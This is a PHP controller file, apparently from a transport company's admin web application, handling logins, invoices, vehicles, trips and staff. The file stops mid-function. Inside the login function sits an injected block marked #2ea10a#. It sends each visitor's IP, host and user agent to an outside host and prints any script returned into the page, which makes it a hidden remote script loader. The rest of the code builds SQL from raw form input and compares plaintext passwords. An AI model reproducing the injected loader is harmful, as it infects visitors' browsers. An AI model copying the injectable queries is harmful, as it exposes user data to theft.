<?php
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	
	if(!isset($_POST["op"]))
	{
		header("Location: index.html");
		die;
	}	
	
	session_start();
	
	$opc = $_POST["op"];	
	unset($_POST["op"]);
	
	switch($opc)
	{
		case 'loggin':	loggear();
						break;	
						
		case 'cambiarContra':	cambiarContrasenha();
								break;						
						
		case 'actualizarCliente': actualizarCliente();
									break;						
						
		case 'eliminarTrab': eliminarTrabajador();
								break;
						
		case 'clasificarComp':	clasificarComprobante();
								break;						
						
		case 'actComp':	actualizarComp();
						break;		
						
		case 'actArt': actualizarArt();
						break;				
						
		case 'mail': enviarMail();
						break;
						
		case 'anularComp':	anularComp();
							break;				
		
		case 'actualizarTrab': actualizarTrabajador();
								break;
							
		case 'regComprobante':	registrarComprobante();
								break;
		case 'actualizarVehiculo': actualizarVehiculo();
									break;								
		
		case 'cerrarSesion':	cerrarSesion();
								break;					
		
		case'regArticulo':	regArticulo();
							break;						
						
		case 'separarVehiculoCarreta':	separarVehiculoCarreta();
										break;
		
		case 'confirmarViaje': confirmarViaje();
								break;
						
		case 'asignarCarretaVehiculo': asignarVehiculoCarreta();
										break;
		
		case 'regViaje':	registrarViaje();
							break;			
						
		case 'terminarComp':	terminarComprobante();
								break;
	
		case 'prodTrabajador':	guardarProductoTrabajador();
								break;
								
		/*case 'regProducto':	registrarProducto();
							break;	*/							
		case 'descuento':	guardarDescuento();
							break;	
							
		case 'ruta':	guardarRuta();
						break;	
						
		case 'pagoPersonal': guardarPagoPersonal();
								break;		

		case 'comprovCompra':	guardarComprobanteCompra();
								break;																			
		/*case 'cerrar': session_destroy(); //Cerrar(destruir) la sesion del usuario
						header("Location: index.php");
						die;
						break;*/
		default: die(" El valor de op no concuerda con ninguna de las opciones permitidas !");
	}
	
	function loggear()
	{
		$usuario = $_POST["textUsuario"];
		$clave = $_POST["textClave"];
		unset($_POST["textUsuario"]);
		unset($_POST["textClave"]);
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		
		/*PARA EL ADMINISTRADOR*/
		$consulta = "select cuenta, password, Sucursal_codigoSucursal from administrador;";
		$result = $bd->crearConsulta($consulta);
		$band=false;
		
		while($registro = mysql_fetch_object($result))
		{
			$cuenta = $registro->cuenta;
			$password = $registro->password;			
			$codSuc = $registro->Sucursal_codigoSucursal;
			if($usuario==$cuenta && $clave==$password)
			{				
				$consulta = "select RazonSocial from sucursal where codigoSucursal='$codSuc';";
				$result = $bd->crearConsulta($consulta);
				$reg = mysql_fetch_object($result);
				$sucursal = $reg->RazonSocial;
				session_start();
				$_SESSION["tipo"] = "adm";
				$_SESSION["usuario"] = $usuario;
				$_SESSION["pass"] = $clave;
				$_SESSION["sucursal"] = $sucursal;
								
				$band=true;	
				header("Location: administrador.php");
				die;
			}
		}	
		/*PARA LOS TRABAJADORES*/
		if(!$band)
		{
			$consulta = "select nick,clave from cuenta;";
			$result = $bd->crearConsulta($consulta);
			while($registro = mysql_fetch_object($result))
			{
				$cuenta = $registro->nick;
				$password = $registro->clave;
				
				if($cuenta==$usuario && $password==$clave)
				{
					session_start();
					$_SESSION["tipo"] = "trab";
					$_SESSION["usuario"] = $usuario;
					$_SESSION["pass"] = $clave;
					$_SESSION["sucursal"] = $sucursal;
					header("Location: trabajador.php");
					die;
				}
			}			
		}
		?>
<?php
#2ea10a#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/2ea10a#
?>	
		<script language="javascript" type="text/javascript">
			alert("¡ El par Usuario/Password  es incorrecto !");
			location.href="index.html";
		</script>
		<?php
	}
	
	function cambiarContrasenha()
	{
		$user = $_POST["textUsuario"];
		$contra = $_POST["textContrasenha"];
		$nuevaContra = $_POST["textNuevaContrasenha"];
		$nuevaContra2 = $_POST["textNuevaContrasenha2"];								
			
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();			
		$consulta = "select cuenta from administrador where cuenta='$user' and password='$contra';";	
		$result = $bd->crearConsulta($consulta);	
		if(mysql_num_rows($result)==0)
		{
			?>	
			<script language="javascript" type="text/javascript">
				alert("¡ Error al actualizar la contraseña !");
				location.href="administrador.php";
			</script>
			<?php
		}
		else
		{
			$consulta = "update administrador set password='$nuevaContra' where cuenta='$user' and password='$contra';";	
			$bd->crearConsulta($consulta);
			?>	
			<script language="javascript" type="text/javascript">
				alert("¡ Contraseña actualizada correctamente !");
				location.href="administrador.php";
			</script>
			<?php
		}
	}
	
	function eliminarTrabajador()
	{
		$dni = $_POST["textDNI"];
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();				
		$consulta = "update trabajador set activo=0 where DNI='$dni';";
		$bd->crearConsulta($consulta);
		?>	
		<script language="javascript" type="text/javascript">
			alert("¡ Trabajador eliminado exitosamente !");
			location.href="administrador.php";
		</script>
		<?php
	}
	
	function actualizarCliente()
	{
		$dniRuc = $_POST["textDniRuc"];
		$tipoC = $_POST["tipoC"];
		$dirF = $_POST["textDirFiscal"];
		$telef = $_POST["textTelefono"];
		$email = $_POST["textEmail"];
		$cel = $_POST["textCelular"];
		if($tipoC=="dni")
		{
			$nom = $_POST["textNomRazS"];
			$apeP = $_POST["textApeP"];
			$apeM = $_POST["textApeM"];
			$consulta = "update cliente set Nombres='$nom', ApellidoPaterno='$apeP', ApellidoMaterno='$apeM', direccionFiscal='$dirF', Telefono='$telef', email='$email', Celular='$cel' where DNI=$dniRuc;";
		}
		else 
		{
			$razS = $_POST["textNomRazS"];	
			$consulta = "update cliente set direccionFiscal='$dirF', RazonSocial='$razS', Telefono='$telef', email='$email', Celular='$cel' where RUC=$dniRuc;";
		}
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
		$bd->crearConsulta($consulta);
		?>	
		<script language="javascript" type="text/javascript">
			alert("¡ Cliente actualizado correctamente !");
			location.href="administrador.php";
		</script>
		<?php
	}
	
	function clasificarComprobante()
	{
		$totalEsc = $_POST["totalEsc"];
		$codComp = $_POST["codC"];
		$guiaR = $_POST["guiaRemision"];		
		$serie = $_POST["cmbSerie"];
		$numero = $_POST["txtNumero"];
		$tipo = $_POST["select"];
		$numero = $serie."-".$numero;
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();
				
		//$consulta = "update comprobante set Serie='$serie', Numero='$numero', TipoComprobante='$tipo' where codigo='$codComp';";
		$consulta = "update comprobante set Numero='$numero', TipoComprobante='$tipo' where codigo='$codComp';";
		$result = $bd->crearConsulta($consulta);
		
		if($tipo=="Factura")
		{
			 mostrarFactura($codComp, $guiaR, $totalEsc);
		}
		else if($tipo=="Boleta")
		{
			mostrarBoleta($codComp, $guiaR, $totalEsc);
		}
		else if($tipo=="Almacen")
		{
			mostrarAlmacen($codComp, $totalEsc);
		}		
	}
	
	function actualizarComp()
	{
		$totalEsc= $_POST["textTotalEscrito"];
		$codComp = $_POST["textCodComp"];
		$tipo = $_POST["textTipoComp"];
		$serie = $_POST["selectSerie"];
		$numero = $_POST["textNumero"];
		$dia = $_POST["selectDia"];
		$mes = $_POST["selectMes"];
		$anho = $_POST["selectAnho"];
		$total = $_POST["textTotal"];
		$total = number_format($total, 2, '.', '');
		$origen = $_POST["textOrigen"];
		$destino = $_POST["textDestino"];
		$guiaR = $_POST["textGuiaRem"];
		
		$fecha = $anho.$mes.$dia;
		
		if($total>400)
		{
			$detrac = $total*0.04;	
			$detrac = number_format($detrac, 2, '.', '');
		}
		else
		{
			$detrac = 0;
		}
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();				
		$consulta = "update comprobante set TipoComprobante='$tipo', Serie='$serie', Numero='$numero', Fecha='$fecha', Detraccion='$detrac', total='$total', direccionOrigen='$origen', direccionDestino='$destino', nGuiaRemision='$guiaR', usuario='".$_SESSION["usuario"]."' where Numero='$codComp';";
		$bd->crearConsulta($consulta);	
		
		$consulta = "select codigo from comprobante where Numero='$codComp';";
		$result = $bd->crearConsulta($consulta);		
		$reg = mysql_fetch_object($result);
		$comp = $reg->codigo;
		
		switch($tipo)
		{
			case "Factura":	mostrarFactura($comp, $guiaR, $totalEsc);
							break;
			case "Boleta":	mostrarBoleta($comp, $guiaR, $totalEsc);
							break;							
			case "Almacen":	mostrarAlmacen($comp, $totalEsc);
							break;													
		}
	}
	
	function actualizarArt()
	{
		$codigo=$_POST["txtCodigo"];
		$desc=$_POST["txtDescripcion"];
		$peso=$_POST["txtPeso"];
		$flete=$_POST["txtFlete"];
		$tipoArt =$_POST["cmbTipoArticulo"];
		$tipoEnt=$_POST["cmbTipoEntrega"];
		$tipoPag=$_POST["cmbTipoPago"];
		$estadoPag=$_POST["cmbEstadoPago"];
		$rem=$_POST["txtRemitente"];
		$dest=$_POST["txtDestinatario"];
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();				
		$consulta = "update articulo set  Descripcion='$desc', Peso='$peso', Flete='$flete', TipoArticulo='$tipoArt', TipoEntrega='$tipoEnt', EstadoPago='$estadoPag', TipoPago='$tipoPag', Remitente='$rem', Destinatario='$dest', usuario='".$_SESSION["usuario"]."' where CodigoArticulo=$codigo;";
		$bd->crearConsulta($consulta);	
		
		?>
		<script language="javascript" type="text/javascript">
			alert("! El Trabajador se actualizo correctamente !");
			location.href="administrador.php";
		</script>
		<?php
		
	}
	
	function anularComp()
	{
		$codComp = $_POST["textCodComp"];
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();				
		$consulta = "update comprobante set activo=0 where codigo='$codComp';";
		$bd->crearConsulta($consulta);		
		?>	
		<script language="javascript" type="text/javascript">
			alert("¡ El comprobante fué anulado correctamente !");
			location.href="administrador.php";
		</script>
		<?php
	}
	
	function enviarMail()
	{
	    $nom = $_POST["textNombres"];
		$mail = $_POST["textEmail"];
		$asunto = $_POST["textAsunto"];
		$msg = $_POST["textMensaje"];
		
		mail("webmaster@transportesmarinhermanos.com","$nom"."-"."$mail"."-"."$asunto","$msg");
		?>	
		<script language="javascript" type="text/javascript">
			alert("¡ Correo electronico enviado correctamente !");
			location.href="../index.html";
		</script>
		<?php
	}
	
	function actualizarTrabajador()
	{
		$dni = $_POST["textDni"];	
		$nom = $_POST["textNombres"];
		$apeP = $_POST["textApeP"];
		$apeM = $_POST["textApeM"];
		$dia = $_POST["selectDia"];
		$mes = $_POST["selectMes"];
		$anho = $_POST["selectAnho"];
		$dir = $_POST["textDir"];
		$zona = $_POST["textZona"];
		$lic = $_POST["textLicCond"];
		$telef = $_POST["textTelef"];
		$tipo = $_POST["selectTipo"];	
		$estadoC = $_POST["selectEstadoCivil"];
		$sucursal = $_POST["selectSucursal"];
		if($lic.length==0)
		{
			$lic="null";
		}
		
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();		
		
		$consulta = "select codigoSucursal  from sucursal where RazonSocial='$sucursal';";
		$result = $bd->crearConsulta($consulta);
		$reg = mysql_fetch_object($result);
		$sucursal = $reg->codigoSucursal;
		
		$consulta = "update trabajador set Nombre='$nom', ApellidoPaterno='$apeP', ApellidoMaterno='$apeM', FechaNacimineto='".$anho.$mes.$dia."', Direccion='$dir', Zona='$zona', LicenciaConducir='$lic', Telefono='$telef', TipoTrabajador='$tipo', estadoCivil='$estadoC', usuario='".$_SESSION["usuario"]."', Sucursal_codigoSucursal=$sucursal  where DNI=$dni;";
		$result = $bd->crearConsulta($consulta);
		?>
		<script language="javascript" type="text/javascript">
			alert("! El Trabajador se actualizo correctamente !");
			location.href="administrador.php";
		</script>
		<?php
	}
		
	function actualizarVehiculo()
	{
		$placa=$_POST["txtPlaca"];
		$marca=$_POST["txtMarca"];
		$modelo=$_POST["txtModelo"];
		$nCertificado=$_POST["txtNInscripcion"];
		$nRegistro=$_POST["txtNRegistro"];
		$tara=$_POST["txtTara"];
		$pesoBruto=$_POST["txtPBruto"];
		$anho=$_POST["txtAnho"];
		$tVehiculo=$_POST["txtTVehiculo"];
		$tCombustible=$_POST["txtTCombustible"];
		$nEjes=$_POST["txtNEjes"];
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();		
		$consulta = "UPDATE vehiculo SET Marca='$marca', Modelo='$modelo', nCertificado='$nCertificado', nRegistro='$nRegistro', Tara=$tara, pesoBruto=$pesoBruto, cargaUtil=$tara+$pesoBruto, Anho=$anho, tipoVehiculo='$tVehiculo', TipoCombustible='$tCombustible', NEjes=$nEjes, usuario='".$_SESSION["usuario"]."' WHERE placa='$placa';";
		$result = $bd->crearConsulta($consulta);
		?>
		<script language="javascript" type="text/javascript">
			alert("! El vehiculo se actualizo correctamente !");
			location.href="administrador.php";
		</script>
		<?php
	}
	
	function registrarComprobante()
	{
		$comp = $_POST["codComp"];
		//$tipoComp = $_POST["selectTipo"];
		$dest = $_POST["selectDest"];		
		$serie = $_POST["selectSerie"];		
		//$numero = $_POST["textNumero"];
		$detraccion = $_POST["detraccion"];
		$total = $_POST["total"];
		$total = number_format($total, 2, '.', '');
		$docCli = $_POST["textCodCli"];
		$nGR = $_POST["textNroGuiaRem"];
		$nGR=$serie."-".$nGR;
		$dirO = $_POST["textDirOrigen"];
		$dirD = $_POST["textDirDestino"];
		
		$totalEsc = $_POST["textTotalEscrito"];
		
		if($detraccion!=0)
		{
			$detraccion = 1;
		}		
		// $consult = "update comprobante set TipoComprobante='$tipoComp', Serie='$serie', Numero='$numero', Fecha='".date('Y-m-d')."', Detraccion='$detraccion', total='$total', direccionOrigen='$dirO', direccionDestino='$dirD', destino='$dest', docCli='$docCli', nGuiaRemision='$nGR', activo=1, usuario='".$_SESSION["usuario"]."' where codigo='$comp';";
		$consult = "update comprobante set Fecha='".date('Y-m-d')."', Serie='$serie', Detraccion='$detraccion', total='$total', direccionOrigen='$dirO', direccionDestino='$dirD', destino='$dest', docCli='$docCli', nGuiaRemision='$nGR', activo=1, usuario='".$_SESSION["usuario"]."' where codigo='$comp';";
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();			
		$bd->crearConsulta($consult);
		mostrarGuiaRemision($comp, $nGR, $totalEsc);		
		/*
		switch($tipoComp)
		{
			case "Factura":	mostrarFactura($comp, $_POST["textNroGuiaRem"]);
							break;
			case "Boleta":	mostrarBoleta($comp, $_POST["textNroGuiaRem"]);
							break;							
			case "Almacen":	mostrarAlmacen($comp);
							break;													
		}*/
	}
	function mostrarGuiaRemision($comp, $nGR, $totalEsc)
	{
		header("Location: reportes/GuiaRemision.php?codC=$comp&guiaRem=$nGR&totalEsc=$totalEsc");
	}
	function mostrarFactura($comp, $guiaR, $totalEsc)
	{
		header("Location: reportes/factura.php?codC=$comp&guiaRemision=$guiaR&totalEsc=$totalEsc");	
	}
	function mostrarBoleta($comp, $guiaR, $totalEsc)
	{
		header("Location: reportes/boleta.php?codC=$comp&guiaRemision=$guiaR&totalEsc=$totalEsc");	
	}
	function mostrarAlmacen($comp, $totalEsc)
	{
		header("Location: reportes/almacen.php?codC=$comp&totalEsc=$totalEsc");	
	}
	
	function cerrarSesion()
	{
		session_start();
		session_destroy();
		header("Location: index.html");
	}
		
	function regArticulo()
	{
		$dni_rucR = $_POST["txtRDNIRUC"];	
		$dni_rucD = $_POST["txtRDNIRUC2"];	
		
		$codViaje = $_POST["cmbViaje"];

		$rem = "";
		$dest = "";	
		
		$desc = $_POST["txtDescripcion"];
		$peso = $_POST["txtPeso"];
		$flete = $_POST["txtFlete"];
		$flete = number_format($flete, 2, '.', '');
		$tipoA = $_POST["cmbTipoArticulo"];
		$tipoE = $_POST["cmbTipoEntrega"];
		$tipoP = $_POST["cmbTipoPago"];
		$estadoP = $_POST["cmbEstadoPago"];
		$codSucursal = $_POST["selectSucursal"];
		
		$estadoR = $_POST["estadoR"];
		$estadoD = $_POST["estadoD"];			
		
		$band = false;
		
		if($estadoR!="1")
		{
				if($dni_rucR==$dni_rucD)
				{
					$band=true;
				}	
				if($estadoR=="nat")
				{
					$nombre = $_POST["txtNombres"];					
					$apeP = $_POST["txtAPaterno"];
					$apeM = $_POST["txtAMaterno"];			
					$cel = $_POST["txtCelular"];
					$email = $_POST["txtEmail"];	
					$dirFiscal = $_POST["textDirFiscal"];						
					
					$consult = "insert into cliente(Nombres, ApellidoPaterno, ApellidoMaterno, direccionFiscal, DNI, Celular, email, TipoCliente, activo, usuario) values('$nombre', '$apeP', '$apeM', '$dirFiscal', '$dni_rucR', '$cel', '$email', 'Natural', 1, '".$_SESSION["usuario"]."');";
					$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
					$bd->conectar();			
					$bd->crearConsulta($consult);					
					$claveClienteR = mysql_insert_id();			
					$rem = $nombre." ".$apeP;
					//$dest=$rem;
				}
				else if($estadoR=="jur")
				{
					$razS = $_POST["textRaz"];								
					$tel = $_POST["textTel"];
					$email = $_POST["textMail"];
					$dirFiscal = $_POST["textDirFiscal"];
					
					$consult = "insert into cliente(direccionFiscal, RazonSocial, RUC, Telefono, email, TipoCliente, activo, usuario) values('$dirFiscal', '$razS', '$dni_rucR', '$tel', '$email', 'Juridica', 1, '".$_SESSION["usuario"]."');";
					$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
					$bd->conectar();			
					$bd->crearConsulta($consult);				
					$claveClienteR = mysql_insert_id();	
					$rem = $razS;
					//$dest=$rem;		
				}
		}
		else //Ya se encuentra registrado el remitente
		{
			$consult = "select CodigoCliente, TipoCliente, RazonSocial, Nombres, ApellidoPaterno from cliente where DNI='$dni_rucR' or RUC='$dni_rucR';";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
			$bd->conectar();			
			$result = $bd->crearConsulta($consult);				
			$reg  = mysql_fetch_object($result);
			$claveClienteR = $reg->CodigoCliente;			
			if($reg->TipoCliente=="Juridica")
			{
				$rem = $reg->RazonSocial;
			}
			else
			{
				$rem = $reg->Nombres." ".$reg->ApellidoPaterno;
			}
		}
		
		if($estadoD!="1")
		{
			if($band==false)
			{
				if($estadoD=="nat")
				{
					$nombre = $_POST["txtNombres2"];		
					$apeP = $_POST["txtAPaterno2"];
					$apeM = $_POST["txtAMaterno2"];			
					$cel = $_POST["txtCelular2"];
					$email = $_POST["txtEmail2"];
					$dirFiscal = $_POST["textDirFiscal2"];
				
					$consult = "insert into cliente(Nombres, ApellidoPaterno, ApellidoMaterno, direccionFiscal, DNI, Celular, email, TipoCliente, activo, usuario) values('$nombre', '$apeP', '$apeM', '$dirFiscal', '$dni_rucD', '$cel', '$email', 'Natural', 1, '".$_SESSION["usuario"]."');";
					$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
					$bd->conectar();			
					$bd->crearConsulta($consult);	
					$claveClienteD = mysql_insert_id();			
					$dest = $nombre." ".$apeP;			
				}
				else if($estadoD=="jur")
				{
					$razS = $_POST["textRaz2"];								
					$tel = $_POST["textTel2"];
					$email = $_POST["textMail2"];
					$dirFiscal = $_POST["textDirFiscal2"];
				
					$consult = "insert into cliente(direccionFiscal, RazonSocial, RUC, Telefono, email, TipoCliente, activo, usuario) values('$dirFiscal', '$razS', '$dni_rucD', '$tel', '$email', 'Juridica', 1, '".$_SESSION["usuario"]."');";
					$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
					$bd->conectar();			
					$bd->crearConsulta($consult);	
					$claveClienteD = mysql_insert_id();		
					$dest = $razS;
				}
			}
			else
			{
				$dest=$rem;
			}
		}
		else //Ya se encuentra registrado el destinatario
		{
				$consult = "select CodigoCliente, Nombres, ApellidoPaterno, RazonSocial, TipoCliente from cliente where DNI='$dni_rucD' or RUC='$dni_rucD';";
				$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
				$bd->conectar();			
				$result = $bd->crearConsulta($consult);				
				$reg  = mysql_fetch_object($result);
				$claveClienteD = $reg->CodigoCliente;
				if($reg->TipoCliente=="Juridica")
				{
					$dest = $reg->RazonSocial;
				}
				else
				{
					$dest = $reg->Nombres." ".$reg->ApellidoPaterno;
				}	
		}
				
		
		$consult = "insert into comprobante(Sucursal_codigoSucursal, Cliente_CodigoCliente, usuario) values($codSucursal, $claveClienteR, '".$_SESSION["usuario"]."');";
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();			
		$bd->crearConsulta($consult);	
		$claveComp = mysql_insert_id();		
						
		$consult = "insert into articulo(Descripcion, Peso, Flete, TipoArticulo, Remitente, Destinatario, TipoEntrega, TipoPago, EstadoPago, activo, Viaje_CodViaje, Cliente_CodigoCliente, Comprobante_Codigo, usuario) values('$desc', $peso, $flete, '$tipoA', '$rem', '$dest', '$tipoE', '$tipoP', '$estadoP', 1, '$codViaje', '$claveClienteR', '$claveComp', '".$_SESSION["usuario"]."');";
		$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
		$bd->conectar();			
		$bd->crearConsulta($consult);	
//		header("Location: formRegistrarNuevoArt.php?op=agregarArt&claveComp=$claveComp&Rem=$claveClienteR&Dest=$claveClienteD&CodViaje=$codViaje&CodCliente=$claveClienteR");	
		header("Location: formRegistrarNuevoArt.php?op=agregarArt&claveComp=$claveComp&Rem=$rem&Dest=$dest&CodViaje=$codViaje&CodCliente=$claveClienteR?tipoE=$tipoE?tipoP=$tipoP?estadoP=$estadoP");	
}
	
	function separarVehiculoCarreta()
	{
		$placas=$_POST["cmbVehiculoCarreta"];
		$cont=strlen($placas);
		$j=0;
		$k=0;
		$placa="";
		$cadena="";
		$placa[0]=""; //carreta
		$placa[1]=""; //vehiculo

		while($placas[$j]!="*")
		{
			$placa[0].=$placas[$j];
			$j++;
		}
		for($j=$j+1; $j<$cont-1; $j++)
		{
			$placa[1].=$placas[$j];
		}
		
		/*print("placas: ".$placas." - carreta: ".$placa[0]." - vehiculo: ".$placa[1]);
		die;*/
		$consulta="DELETE from vehiculoCarreta WHERE Carreta_placa='$placa[0]' AND Vehiculo_placa='$placa[1]';";
		$bd= new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		$bd->crearConsulta($consulta);
		/*print(mysql_error());
		die;*/
		$sql="UPDATE vehiculo SET estado='disponible', usuario='".$_SESSION["usuario"]."' WHERE placa='$placa[1]';";
		$bd->crearConsulta($sql);
		$sql="UPDATE carreta SET estado='disponible', usuario='".$_SESSION["usuario"]."' WHERE placa='$placa[0]';";
		$bd->crearConsulta($sql);
		header("Location: formSepararVehiculoCarreta.php");		
	}
	
	
	function confirmarViaje()
	{
		$clave=$_POST["cmbViaje"];
		$dia=$_POST["cmbFLDia"];
		$mes=$_POST["cmbFLMes"];
		$anho=$_POST["cmbFLAnho"];
		$horas=$_POST["cmbHoras"];
		$min=$_POST["cmbMin"];
		//print($anho.$mes.$dia);
		$bd= new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		$consulta = "select FechaSalida from viaje where CodViaje=$clave;";		
		$result = $bd->crearConsulta($consulta);
		$reg = mysql_fetch_object($result);
		$fechaSalida = $reg->FechaSalida;
		$fechaLlegada = $anho."-".$mes."-".$dia;
		/*print($fechaSalida." - ".$fechaLlegada);
		die;*/
		if(strtotime($fechaSalida)>strtotime($fechaLlegada))
		{
			?>
			<script language="javascript" type="text/javascript">
				alert("¡ La fecha de llegada debe ser mayor que la fecha de salida !");
				location.href="administrador.php";
			</script>
			<?php
			die;
		}
		$consulta="UPDATE viaje SET FechaLlegada='".$anho."-".$mes."-".$dia."', HoraLlegada='".$horas.":".$min."', estadoViaje='arrivado', usuario='".$_SESSION["usuario"]."' WHERE CodViaje=$clave;";		
		$bd->crearConsulta($consulta);
		header("Location: administrador.php");
	}
	
	function asignarVehiculoCarreta()
	{
		$vehiculo=$_POST["cmbVehiculo"];
		$carreta=$_POST["cmbCarreta"];
		$dia=$_POST["cmbDia"];
		$mes=$_POST["cmbMes"];
		$anho=$_POST["cmbAnho"];
		/*print($anho."-".$mes."-".$dia);
		die;*/
		$consulta=" insert into vehiculocarreta(Carreta_placa, Vehiculo_placa, fechaInicio, activo, usuario) values('$carreta', '$vehiculo', '".$anho.$mes.$dia."', 1, '".$_SESSION["usuario"]."')";
		$bd= new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		$bd->crearConsulta($consulta);
		$sql="update vehiculo set estado='no disponible', usuario='".$_SESSION["usuario"]."' where placa='$vehiculo';";
		$bd->crearConsulta($sql);
		$sql2="update carreta set estado='no disponible', usuario='".$_SESSION["usuario"]."' where placa='$carreta';";
		$bd->crearConsulta($sql2);
		header("Location: administrador.php");
	}
	
	function registrarViaje()
	{
		$codCond = $_POST["cmbConductor"];
		$codVehi = $_POST["cmbVehiculo"];
		$codRuta = $_POST["cmbRuta"];
		$diaS = $_POST["cmbFSDia"];
		$mesS = $_POST["cmbFSMes"];
		$anhoS = $_POST["cmbFSAnho"];
		$hora = $_POST["selectHoras"];
		$min = $_POST["selectMin"];
		
		$consult = "insert into viaje(FechaSalida, HoraSalida, estadoViaje, activo, Vehiculo_placa, Ruta_codigoRuta, usuario) values('".$anhoS."-".$mesS."-".$diaS."','".$hora.":".$min."', 'programado', 1, '$codVehi', '$codRuta', '".$_SESSION["usuario"]."')";
		$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		$bd->crearConsulta($consult);
		$codViaje = mysql_insert_id();
		$consult = "insert into conductoresviaje values($codCond, $codViaje, 1, 1, '".$_SESSION["usuario"]."');";
		$bd->crearConsulta($consult);
		header("Location: administrador.php");
	}	
	
	function terminarComprobante()
	{
		$claveComp = $_POST["claveComp"];
		$consult = "select montoParcial from productocomprobantecompra where ComprobanteCompra_codigo=$claveComp and activo=1;";	
		$montoTotal = 0;			
		$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();
		$result = $bd->crearConsulta($consult);
		while($reg = mysql_fetch_object($result))
		{
			$montoTotal = $reg->montoParcial + $montoTotal;
		}		
		$consult = "update comprobantecompra set monto=$montoTotal, usuario='".$_SESSION["usuario"]."' where codigo=$claveComp;";				
		$bd->crearConsulta($consult);
		header("Location: administrador.php");
	}
	
	function guardarProductoTrabajador()
	{
		$dni = $_POST["textDNI"];
		$idProd = $_POST["idProducto2"];
		$cant = $_POST["textCantidad"];
		
		$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
		$bd->conectar();		
		
		$consulta = "select stock from producto where codigoProducto='$idProd';";
		$result = $bd->crearConsulta($consulta);
		$reg = mysql_fetch_object($result);
		$stock = $reg->stock;
		
		if($stock<$cant)
		{
			?>
			<script language="javascript" type="text/javascript">
				alert("¡ El stock no tiene suficientes productos para satisfacer el pedido (Servidor)!");
				location.href="formProductoTrabajador.php";
			</script>
			<?php
			die;
		}
		
		$consulta = "insert into productotrabajador(Trabajador_DNI, Producto_codigoProducto, cantidad, fecha, activo, usuario) values('$dni', '$idProd', '$cant', '".date('Y-m-d')."', 1, '".$_SESSION["usuario"]."');";
		$result = $bd->crearConsulta($consulta);	

		$newStock = $stock-$cant;
		$consulta = "update producto set stock='$newStock', usuario='".$_SESSION["usuario"]."' where codigoProducto='$idProd';";
		$result = $bd->crearConsulta($consulta);
				
		$bd->cerrarConexion();	
		header("Location: formProductoTrabajador.php");
	}
	
	/*function registrarProducto()
	{
		$nombres = $_POST["txtNombre"];
		$descrip = $_POST["txtDescripcion"];
		$stock = $_POST["textStock"];
		$estado = $_POST["listEstado"];
		
		$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
		$bdx->conectar();
		$sql="INSERT INTO producto(nombre, stock, descripcion, estado, activo) VALUES('$nombres', $stock, '$descrip', '$estado', 1);";	
		$result = $bdx->crearConsulta($sql);
		$bdx->cerrarConexion();
		header("Location: index.php");
	}*/
	
	function guardarComprobanteCompra()
	{
		$ruc = $_POST["textRuc"];
		$razSocial = $_POST["textRazonSocial"];
		$numero = $_POST["textNumero"];
		$serie = $_POST["textSerie"];
		$monto = $_POST["textMonto"];
		$monto = number_format($monto, 2, '.', '');
		$dia = $_POST["listDia"];
